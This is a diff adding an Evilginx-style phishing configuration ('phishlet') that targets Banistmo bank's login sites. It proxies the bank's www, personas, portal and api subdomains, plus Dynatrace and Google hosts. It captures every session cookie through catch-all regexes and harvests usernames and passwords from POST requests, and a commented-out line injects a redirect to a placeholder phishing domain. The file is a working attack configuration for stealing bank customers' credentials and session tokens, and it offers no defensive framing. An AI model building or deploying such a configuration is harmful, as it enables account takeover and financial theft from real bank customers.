@@ -1,0 +1,40 @@
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'banistmo.com', session: true, is_landing: true}
+  - {phish_sub: 'personas', orig_sub: 'personas', domain: 'banistmo.com', session: false, is_landing: false}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'banistmo.com', session: true, is_landing: true}
+  - {phish_sub: 'bf', orig_sub: 'bf24030jpn.bf', domain: 'dynatrace.com', session: true, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'banistmo.com', session: true, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'banistmo.com', session: true, is_landing: false}
+
+
+sub_filters:
+#  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '</script>', replace: ';document.location="https://login.YOURDOMA.IN/#/login/e1837f4d-1d0c-49b8-a242-8f653226c137";</script>', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.banistmo.com', orig_sub: 'www', domain: 'banistmo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'personas.banistmo.com', orig_sub: 'personas', domain: 'banistmo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'portal.banistmo.com', orig_sub: 'portal', domain: 'banistmo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'api.banistmo.com', orig_sub: 'api', domain: 'banistmo.com', search: 'api.{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'bf24030jpn.bf.dynatrace.com', orig_sub: 'bf24030jpn.bf', domain: 'dynatrace.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+
+
+auth_tokens:
+  - domain: '.banistmo.com'
+    keys: ['(.+),regexp']
+  - domain: '(.+),regexp'
+    keys: ['(.+),regexp']
+credentials:
+  username:
+    key: 'guid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'personas.banistmo.com'
+  path: ''
